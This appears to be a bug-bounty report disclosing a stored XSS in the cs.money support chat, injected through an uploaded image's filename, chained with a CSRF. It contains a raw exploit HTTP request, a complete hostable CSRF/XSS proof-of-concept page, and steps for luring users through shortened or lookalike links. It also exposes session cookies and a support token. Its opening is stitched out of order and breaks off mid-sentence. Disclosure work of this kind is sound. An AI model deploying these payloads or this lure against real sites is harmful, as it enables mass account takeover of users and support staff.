This one will post the image with payload\n\n## Supporting Material/References:\nhttps://onlinestringtools.com/convert-string-to-ascii      to convert the attacker's website link to ascii\n\n## Impact\n\nAllows the hacker to execute javascript. If the victim click in a link provided by the hacker, then go to the chat support in ANY TIME after this, XSS will be activated.\nFor the guys of support chat, they don't even need to click in the

team!\n#Sumary\n\n**While I was doing this report, I realized that the problem can be much bigger than it looks, a critical failure if done right. Please read through. (Mass XSS for thousands of users in the main domain!)**\n\nWith the combination of 2 vulnerabilities, being an XSS and a CSRF, a hacker is able to execute javascript in the browser of a user who clicks on his malicious link and __ has the chat open__, in order to make unauthorized requests, steal sensitive data , cookies, etc.\n\n##Vulnerability 1, XSS\n\nLooking for vulnerabilities through the support chat, in the cs.money domain, I sent an image and intercepted the request with a proxy (burp suite). After a few attempts, I found a vulnerability. It occurs when we send a valid image and change the file name to ```\\\" onerror = \\\"alert(123)\\\" \\\"``` where `alert(123)` can be any javascript code. Therefore, the request is:\n\n\n````\nPOST /upload_file HTTP/1.1\nHost: support.cs.money\nConnection: close\nContent-Length: 300\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryEli0YqmeiCgcrWw7\nAccept: */*\nOrigin: https://cs.money\nSec-Fetch-Site: same-site\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://cs.money/\nAccept-Encoding: gzip, deflate\nAccept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7\nCookie: __cfduid=d5c38651b1bd0e7faf431d4a677b64e8f1603121898; _gid=GA1.2.869853770.1603121908; _gcl_au=1.1.337254443.1603121910; _ym_uid=1603121910582607466; _ym_d=1603121910; _ym_isad=1; steamid=76561198877716307; avatar=https://steamcdn-a.akamaihd.net/steamcommunity/public/images/avatars/fe/fef49e7fa7e1997310d705b2a6158ff8dc1cdfeb_medium.jpg; username=bwmsdroid%20CS.MONEY; support_token=cef502aab9fb9084a9b2e4665123b6919395c765a596f51437018d54917881e8; amplitude_id_c14fa5162b6e034d1c3b12854f3a26f5cs.money=eyJkZXZpY2VJZCI6IjI4YjlmOTE4LTk5MDUtNDE3OC1hODRhLTA5YTk4ZjU1Yzc3MVIiLCJ1c2VySWQiOiI3NjU2MTE5ODg3NzcxNjMwNyIsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTYwMzEyMTkwNTE5OCwibGFzdEV2ZW50VGltZSI6MTYwMzEyMjAwNTcyMywiZXZlbnRJZCI6MywiaWRlbnRpZnlJZCI6MCwic2VxdWVuY2VOdW1iZXIiOjN9; _csrf=-pCD9Sf44p7MBAeIQuJ7VLtC; username=bwmsdroid%20CS.MONEY; connect.sid=s%3AXxrkBKLslLCGfzvmtUQvRGRhlrey3IvW.%2BA%2B7pqLL08F9j4Zl6kOwHRkkEqvtdr%2BUrxef7svS3Jg; _ga=GA1.1.810003942.1603121908; _ga_HY7CCPCD7H=GS1.1.1603121906.1.1.1603122063.60; _gali=online_chat_file_input\n\n------WebKitFormBoundaryEli0YqmeiCgcrWw7\nContent-Disposition: form-data; name=\"file\"; filename=\"\\\" onerror = \\\"alert(123)\\\" \\\"\"\nContent-Type: image/png\n\nPNG\n\u001a\n------WebKitFormBoundaryEli0YqmeiCgcrWw7--\n```\n\nUp to this point, we can only run XSS in our own browser and in the agent support browser.\nIt is in this situation that the CSRF enters.\n\n##Vulnerability 2, CSRF\nLooking for a way to expand XSS attack targets, I realized that, in order to send IMAGES (not messages), the server DOES NOT CHECK HEADERS ʻOrigin` and `Reference`, in addition to having no csrf-token. So, this is the perfect scenario for a hacker to send an unauthorized request. Thus, the hacker can host a file like this on his server:\n\n````\n\u003chtml\u003e\n  \u003cbody\u003e\n    \u003cscript\u003e\n      function submitRequest()\n      {\n        var xhr = new XMLHttpRequest();\n        xhr.open(\"POST\", \"https://support.cs.money/upload_file\", false);\n        xhr.setRequestHeader(\"Accept\", \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\");\n        xhr.setRequestHeader(\"Accept-Language\", \"de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\");\n        xhr.setRequestHeader(\"Content-Type\", \"multipart/form-data; boundary=---------------------------256672629917035\");\n        xhr.withCredentials = \"true\";\n        var body = \"-----------------------------256672629917035\\r\\n\" +\n          \"Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"\\\\\\\" onerror=alert('xss') \\\\\\\"\\\"\\r\\n\" +\n          \"Content-Type: image/png\\r\\n\" +\n          \"\\r\\n\" +\n          String.fromCharCode(0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, 0xC4, 0x89, 0x00, 0x00, 0x00, 0x01, 0x73, 0x52, 0x47, 0x42, 0x00, 0xAE, 0xCE, 0x1C, 0xE9, 0x00, 0x00, 0x00, 0x04, 0x67, 0x41, 0x4D, 0x41, 0x00, 0x00, 0xB1, 0x8F, 0x0B, 0xFC, 0x61, 0x05, 0x00, 0x00, 0x00, 0x09, 0x70, 0x48, 0x59, 0x73, 0x00, 0x00, 0x0E, 0xC3, 0x00, 0x00, 0x0E, 0xC3, 0x01, 0xC7, 0x6F, 0xA8, 0x64, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x44, 0x41, 0x54, 0x18, 0x57, 0x63, 0xF8, 0xFB, 0xF7, 0xFF, 0x7F, 0x00, 0x09, 0xED, 0x03, 0xF9, 0x94, 0x8C, 0x14, 0xA8, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82) + \"\\r\\n\" +\n          \"-----------------------------256672629917035--\\r\\n\";\n        var aBody = new Uint8Array(body.length);\n        for (var i = 0; i \u003c aBody.length; i++)\n          aBody[i] = body.charCodeAt(i);\n        xhr.send(new Blob([aBody]));\n      }\n    try{      submitRequest();\n        \n    }catch(e){\n        location.href=\"https://cs.money\";\n        \n    }\n    \u003c/script\u003e\n    \n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\nA brief explanation: when clicking on the link, the user's browser (which is authenticated and having a conversation with the support agent) makes a request to `https://support.cs.money/upload_file` keeping the cookies, with the payload in the filename field and a valid image. So, as the server does not check the headers `Origin` and `Reference` it accepts the request sent as if it were legitimate.\nThen he is redirected to the cs.money website. After that, when the user clicks on the support button again, XSS will go into action (cs.money for ordinary users and support.cs.money for support agents).\n\n##Steps to reproduce\n\n### XSS\n\n- Start a chat with support;\n- Configure a proxy as a burp suite in your browser;\n- Send a valid image and change the `filename` to ```\\\" onerror = \\\"alert(123)\\\" \\\"``` ;\n- You will be redirected to cs.money, click on the support chat.\n- You will see an alert(123), the support agent will also see this when accessing your chat!\n\n### CSRF\n- Host the file where I explained the CSRF to a server, such as 000webhost, with the name of ʻindex.php`\n- Take the link to your file and shorten it, (bit.ly) with a more friendly link; or use a domain like `csmoney.shop`\n- Now the hacker can send the link to users who have active chat via discord or another means.\n\n## Conclusion\nIt is possible for the hacker to send to the support agent a payload that responds to EVERYONE users who have already made a ticket (even those with closed support chat), containing an XSS that will be sent to each user. THIS IS A MASSIVE XSS, as surely a support has already helped thousands of users, imagine if the hacker sends this to several support agents, the situation would turn into total chaos, with thousands of accounts being affected. Please correct the vulnerabilities as soon as
